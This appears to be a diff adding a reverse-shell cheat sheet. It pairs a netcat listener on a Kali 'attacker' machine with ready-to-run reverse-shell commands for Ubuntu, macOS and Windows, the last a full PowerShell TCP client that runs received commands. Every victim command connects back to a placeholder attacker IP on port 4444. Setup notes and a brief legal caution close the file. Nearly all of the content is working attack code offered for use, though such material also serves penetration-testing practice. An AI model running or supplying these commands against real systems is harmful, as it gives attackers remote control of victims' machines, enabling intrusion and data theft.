@@ -1,0 +1,28 @@
+[ATTACKER]
+# KALI LINUX #
+  // Set up listener on Kali Linux
+  nc -lvp 4444
+
+[VICTIM MACHINE]
+# UBUNTU #
+  // Start a reverse shell on Ubuntu victim machine
+  bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1
+    
+# WINDOWS #
+  // Start a reverse shell on Windows victim machine
+  powershell -NoProfile -Command "$client = New-Object System.Net.Sockets.TCPClient('[ATTACKER_IP]', 4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()"
+    
+# MAC OS #
+  // Start a reverse shell on macOS victim machine
+  bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"
+
+Important Notes:
+Firewall Considerations: Ensure that any firewalls (both on the attacker and victim sides) allow traffic on port 4444.
+
+IP Address: Replace [ATTACKER_IP] with the actual IP address where your Kali Linux machine is accessible.
+
+Netcat Availability: Ensure nc (Netcat) is installed on your Kali Linux machine. If not, you can install it using apt install netcat.
+
+Security: Be cautious when performing such actions in real environments. Unauthorized access or misuse can have legal consequences.
+
+By following these guidelines, you should be able to establish reverse shells from Ubuntu, Windows, and macOS to your Kali Linux attacker machine successfully.
